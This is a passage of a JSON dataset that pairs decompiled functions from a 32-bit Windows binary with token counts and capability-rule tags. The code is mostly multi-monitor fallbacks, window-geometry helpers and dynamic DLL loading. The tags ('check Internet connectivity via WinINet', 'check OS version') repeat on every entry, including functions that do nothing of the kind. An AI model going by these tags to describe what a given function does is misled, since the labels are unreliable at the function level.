        "decompiled_code": "\nuint __cdecl fcn.0042dc98(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x485926 == '\\0') {\n        *0x485904 = fcn.0042db1c();\n        uVar1 = (**0x485904)(arg_8h, arg_ch);\n        return uVar1;\n    }\n    if ((arg_ch & 3) == 0) {\n        if (arg_8h[2] < 1) {\n            return 0;\n        }\n        if (arg_8h[3] < 1) {\n            return 0;\n        }\n        iVar2 = (**0x4858fc)(0);\n        if (iVar2 <= *arg_8h) {\n            return 0;\n        }\n        iVar2 = (**0x4858fc)(1);\n        if (iVar2 <= arg_8h[1]) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 233
    },
    "0042dd28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042dd28(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_10h;\n    \n    if (*0x485925 == '\\0') {\n        *0x485900 = fcn.0042db1c();\n        uVar1 = (**0x485900)(arg_8h, arg_ch);\n    }\n    else if ((arg_ch & 3) == 0) {\n        iVar2 = sub.user32.dll_IsIconic(arg_8h);\n        if (iVar2 == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n        }\n        else {\n            sub.user32.dll_GetWindowPlacement(arg_8h, &var_2ch);\n        }\n        uVar1 = fcn.0042dc98(&var_10h, arg_ch);\n    }\n    else {\n        uVar1 = 0x12340042;\n    }\n    return uVar1;\n}\n",
        "token_count": 234
    },
    "0042ddc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042ddc0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x485927 == '\\0') {\n        *0x485908 = fcn.0042db1c();\n        uVar1 = (**0x485908)(arg_8h, arg_ch, arg_10h);\n        return uVar1;\n    }\n    if ((arg_10h & 3) == 0) {\n        if (arg_8h < 0) {\n            return 0;\n        }\n        iVar2 = (**0x4858fc)(0);\n        if (iVar2 <= arg_8h) {\n            return 0;\n        }\n        if (arg_ch < 0) {\n            return 0;\n        }\n        iVar2 = (**0x4858fc)(1);\n        if (iVar2 <= arg_ch) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 235
    },
    "0042de58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042de58(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x485928 == '\\0') {\n        *0x48590c = fcn.0042db1c();\n        uVar1 = (**0x48590c)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x4858fc)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x4858fc)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x4b < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42df24);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 398
    },
    "0042df2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042df2c(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x485929 == '\\0') {\n        *0x485910 = fcn.0042db1c();\n        uVar1 = (**0x485910)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x4858fc)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x4858fc)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x4b < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42dff8);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 397
    },
    "0042e000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e000(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x48592a == '\\0') {\n        *0x485914 = fcn.0042db1c();\n        uVar1 = (**0x485914)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x4858fc)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x4858fc)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x4b < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42e0cc);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 398
    },
    "0042e0d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e0d4(int32_t arg_8h, int32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x48592b == '\\0') {\n        *0x485918 = fcn.0042db1c();\n        uVar1 = (**0x485918)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        uVar1 = 0;\n        if (arg_10h != NULL) {\n            var_1ch = 0;\n            var_18h = 0;\n            var_14h = (**0x4858fc)(0);\n            var_10h = (**0x4858fc)(1);\n            if (arg_8h == 0) {\n                if ((arg_ch != 0) && (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    return 1;\n                }\n            }\n            else {\n                var_ch = sub.gdi32.dll_GetClipBox(arg_8h, &var_2ch);\n                iVar2 = sub.gdi32.dll_GetDCOrgEx(arg_8h, &var_8h);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                sub.user32.dll_OffsetRect(&var_1ch, -var_8h, -var_4h);\n                iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, &var_2ch);\n                if (((iVar2 == 0) || (arg_ch != 0)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    if (var_ch != 1) {\n                        return 0;\n                    }\n                    return 1;\n                }\n            }\n            uVar1 = (*arg_10h)(0x12340042, arg_8h, &var_1ch, arg_14h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 554
    },
    "0042ec70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042ec70(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0;\n    uVar5 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    var_10h = 0;\n    iVar4 = 0;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (param_1 != 0) {\n        fcn.0040461c();\n    }\n    iVar2 = *(*(var_4h + 0x10) + 8);\n    if (0 < iVar2) {\n        if (-1 < iVar2 + -1) {\n            iVar3 = 0;\n            do {\n                iVar1 = fcn.0042d8b8();\n                iVar1 = (**(**(iVar1 + 4) + 0x10))();\n                if (0 < iVar1) {\n                    iVar4 = iVar4 + 1;\n                    var_10h = iVar3;\n                }\n                iVar3 = iVar3 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (iVar4 == 0) {\n            var_2ch = fcn.00404a88();\n            var_28h._0_1_ = 6;\n            uVar5 = 0;\n            fcn.0040c9d4(0, &var_2ch);\n            fcn.00403fc0();\n        }\n        if (iVar4 == 1) {\n            iVar2 = fcn.0042d8b8();\n            (**(**(iVar2 + 4) + 0x20))();\n        }\n        if (1 < iVar4) {\n            var_14h = fcn.004037f0();\n            iVar4 = *(*(var_4h + 0x10) + 8);\n            if (-1 < iVar4 + -1) {\n                do {\n                    var_1ch = fcn.0042d8b8();\n                    iVar2 = (**(**(var_1ch + 4) + 0x10))();\n                    if (0 < iVar2) {\n                        var_18h = (**(**(var_1ch + 4) + 0x14))();\n                        iVar2 = (**(*var_18h + 0x14))();\n                        if (-1 < iVar2 + -1) {\n                            var_ch = 0;\n                            var_24h = iVar2;\n                            do {\n                                (**(*var_18h + 0xc))();\n                                (**(*var_14h + 0x3c))();\n                                var_ch = var_ch + 1;\n                                var_24h = var_24h + -1;\n                            } while (var_24h != 0);\n                        }\n                        fcn.00403820();\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            if (*(var_4h + 0xc) == 0) {\n                iVar4 = (**(*var_14h + 0x18))();\n                (**(*var_14h + 0xc))();\n                (**(**(iVar4 + 4) + 0x20))();\n            }\n            else {\n                (**(*var_14h + 0x90))();\n                iVar4 = (**(**(var_4h + 0xc) + 0xc))();\n                if (-1 < iVar4) {\n                    iVar4 = (**(*var_14h + 0x18))();\n                    (**(*var_14h + 0xc))();\n                    (**(**(iVar4 + 4) + 0x20))();\n                }\n            }\n            fcn.00403820();\n        }\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.004045c8();\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 1022
    },
    "0042ee84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ee84(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x42ef77;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.0040461c();\n        puVar1 = puStack44;\n    }\n    puStack44 = puVar1;\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (iVar3 == 0) {\n        fcn.0040c998();\n        fcn.00403fc0();\n    }\n    else if (-1 < iVar3 + -1) {\n        do {\n            fcn.0042d8b8();\n            fcn.004062b0();\n            fcn.004062dc();\n            cVar2 = (**(_pe_dos_header + 0x38))();\n            if (cVar2 != '\\0') {\n                fcn.004062dc();\n                (**(_pe_dos_header + 0x3c))();\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x42ef7e;\n    uStack48 = 0x42ef6e;\n    fcn.00405080();\n    uStack48 = 0x42ef76;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 450
    },
    "0042f09c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042f09c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x42f0ae;\n    fcn.0040630c();\n    uStack20 = 0x42f0eb;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0xc) != 0) {\n        puStack16 = &stack0xfffffffc;\n        fcn.00406298();\n    }\n    fcn.004062b0();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x42f0f2;\n    uStack20 = 0x42f0ea;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 219
    },
    "0042f0f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f0f8(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t in_ECX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42f111;\n    fcn.00404a78();\n    uStack28 = 0x42f18d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        puStack24 = &stack0xfffffffc;\n        fcn.0040461c();\n    }\n    iVar1 = arg_ch;\n    if (iVar1 == 1) {\n        fcn.0042ee84();\n    }\n    else if (iVar1 == 2) {\n        fcn.0042e998();\n    }\n    else if (iVar1 == 3) {\n        fcn.0042e9c8();\n    }\n    else {\n        fcn.0042eb68(arg_8h, arg_ch);\n        in_stack_ffffffd8 = arg_8h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x42f194;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 329
    },
    "0042e6ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042e6ac(uint param_1, uint *param_2)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    uStack24 = 0x42e722;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puVar1 = &stack0xfffffffc;\n    if (*0x485938 == 0) {\n        *0x485938 = fcn.0042e7c4();\n        puVar1 = puStack20;\n    }\n    puStack20 = puVar1;\n    fcn.0042e838();\n    fcn.004062b0();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x42e729;\n    uStack24 = 0x42e721;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 263
    },
    "0042e730": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042e730(void)\n\n{\n    uint *in_EAX;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = 0;\n    }\n    if (*0x485938 == 0) {\n        *0x485938 = fcn.0042e7c4();\n    }\n    fcn.004062dc();\n    return 0;\n}\n",
        "token_count": 86
    },
    "0042e9c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042e9c8(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x42eb5a;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*(*(in_EAX + 0x10) + 8) == 1) {\n        puStack44 = 0x42e9f7;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.0042d8b8();\n        puStack44 = 0x42e9ff;\n        cVar2 = (**(**(iVar3 + 4) + 0x18))();\n        if (cVar2 != '\\0') {\n            puStack44 = 0x42ea11;\n            iVar3 = fcn.0042d8b8();\n            puStack44 = 0x42ea19;\n            (**(**(iVar3 + 4) + 0x1c))();\n        }\n    }\n    else {\n        if (*(in_EAX + 0xc) != 0) {\n            puStack44 = 0x42ea34;\n            puStack32 = &stack0xfffffffc;\n            piVar4 = fcn.004037f0();\n            uStack48 = 0x42eaf5;\n            uStack52 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffcc;\n            var_ch = *(*(in_EAX + 0x10) + 8);\n            puStack44 = &stack0xfffffffc;\n            puVar1 = &stack0xfffffffc;\n            if (-1 < var_ch + -1) {\n                do {\n                    puStack44 = puVar1;\n                    iVar3 = fcn.0042d8b8();\n                    cVar2 = (**(**(iVar3 + 4) + 0x18))();\n                    if (cVar2 != '\\0') {\n                        (**(**(iVar3 + 4) + 0xc))();\n                        (**(*piVar4 + 0x3c))();\n                    }\n                    var_ch = var_ch + -1;\n                    puVar1 = puStack44;\n                } while (var_ch != 0);\n            }\n            iVar3 = (**(*piVar4 + 0x14))();\n            if (iVar3 < 2) {\n                iVar3 = (**(*piVar4 + 0x18))();\n                (**(**(iVar3 + 4) + 0x1c))();\n            }\n            else {\n                (**(*piVar4 + 0x90))();\n                (**(**(in_EAX + 0xc) + 0x10))();\n                iVar3 = (**(*piVar4 + 0x18))();\n                (**(**(iVar3 + 4) + 0x1c))();\n            }\n            *in_FS_OFFSET = uStack52;\n            puStack44 = 0x42eb44;\n            uStack48 = 0x42eaf4;\n            fcn.00403820();\n            return;\n        }\n        puVar1 = &stack0xfffffffc;\n        if (0 < *(*(in_EAX + 0x10) + 8)) {\n            puStack44 = 0x42eb0e;\n            iVar3 = fcn.0042d8b8();\n            puStack44 = 0x42eb16;\n            cVar2 = (**(**(iVar3 + 4) + 0x18))();\n            puVar1 = puStack32;\n            if (cVar2 != '\\0') {\n                puStack44 = 0x42eb24;\n                iVar3 = fcn.0042d8b8();\n                puStack44 = 0x42eb2c;\n                (**(**(iVar3 + 4) + 0x1c))();\n                goto code_r0x0042eb44;\n            }\n        }\n        puStack32 = puVar1;\n        puStack44 = 0x42eb3f;\n        fcn.0040c998();\n        puStack44 = 0x42eb44;\n        fcn.00403fc0();\n    }\ncode_r0x0042eb44:\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42eb61;\n    uStack36 = 0x42eb59;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 1077
    },
    "0042f298": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042f298(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uchar auStack16 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack16;\n    *0x485934 = *0x485934 + 1;\n    if ((*0x485934 == 0) && (*0x485938 != 0)) {\n        *0x485938 = 0;\n    }\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 118
    },
    "0042f35c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042f35c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x48596c != NULL) {\n        iVar2 = (**0x48596c)(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x0042f388;\n        }\n    }\n    uVar1 = 0;\ncode_r0x0042f388:\n    return -uVar1;\n}\n",
        "token_count": 152
    },
    "0042f390": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042f390(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    if (*0x485970 != NULL) {\n        iVar2 = (**0x485970)(arg_8h);\n        if (iVar2 != 0) {\n            uVar1 = 1;\n            goto code_r0x0042f3b0;\n        }\n    }\n    uVar1 = 0;\ncode_r0x0042f3b0:\n    return -uVar1;\n}\n",
        "token_count": 124
    },
    "0042f820": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042f820(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = 0x42f82d;\n    fcn.0042f7d8();\n    uStack12 = 0x42f9d7;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    if (0 < *0x485a40) {\n        *0x485a40 = *0x485a40 + -1;\n    }\n    puStack8 = &stack0xfffffffc;\n    if ((*0x485a3c != 0) && (puStack8 = &stack0xfffffffc,  *0x485a40 == 0)) {\n        iStack20 = *0x485a3c;\n        puStack8 = &stack0xfffffffc;\n        sub.kernel32.dll_FreeLibrary_1();\n        *0x485a3c = 0;\n        *0x48597c = 0;\n        *0x485980 = 0;\n        *0x485984 = 0;\n        *0x485988 = 0;\n        *0x48598c = 0;\n        *0x485990 = 0;\n        *0x485994 = 0;\n        *0x485998 = 0;\n        *0x48599c = 0;\n        *0x4859a0 = 0;\n        *0x4859a4 = 0;\n        *0x4859a8 = 0;\n        *0x4859ac = 0;\n        *0x4859b0 = 0;\n        *0x4859b4 = 0;\n        *0x4859b8 = 0;\n        *0x4859bc = 0;\n        *0x4859c0 = 0;\n        *0x4859c4 = 0;\n        *0x4859c8 = 0;\n        *0x4859cc = 0;\n        *0x4859d0 = 0;\n        *0x4859d4 = 0;\n        *0x4859d8 = 0;\n        *0x4859dc = 0;\n        *0x4859e0 = 0;\n        *0x4859e4 = 0;\n        *0x4859e8 = 0;\n        *0x4859ec = 0;\n        *0x4859f0 = 0;\n        *0x4859f4 = 0;\n        *0x4859f8 = 0;\n        *0x4859fc = 0;\n        *0x485a00 = 0;\n        *0x485a04 = 0;\n        *0x485a08 = 0;\n        *0x485a0c = 0;\n        *0x485a10 = 0;\n        *0x485a14 = 0;\n        *0x485a18 = 0;\n        *0x485a1c = 0;\n        *0x485a20 = 0;\n        *0x485a24 = 0;\n        *0x485a28 = 0;\n        *0x485a2c = 0;\n        *0x485a30 = 0;\n        *0x485a34 = 0;\n    }\n    *in_FS_OFFSET = iStack20;\n    uStack12 = 0x42f9de;\n    iStack16 = 0x42f9d6;\n    fcn.0042f7e0();\n    return;\n}\n",
        "token_count": 825
    },
    "0042f9e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0042f9e0(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffe6c;\n    int32_t iStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x42f9f4;\n    fcn.0042f7d8();\n    uStack20 = 0x42fd93;\n    iStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    *0x485a40 = *0x485a40 + 1;\n    puStack16 = &fcn.0042f9e0::var_1h + 1;\n    if (*0x485a3c == 0) {\n        puStack16 = &fcn.0042f9e0::var_1h + 1;\n        *0x485a3c = sub.kernel32.dll_LoadLibraryA(0x42fda4);\n        if (*0x485a3c != 0) {\n            *0x48597c = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fdb0);\n            *0x485980 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fdc0);\n            *0x485984 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 0x42fdd0);\n            *0x485988 = sub.kernel32.dll_GetProcAddress_1(*0x485a3c, 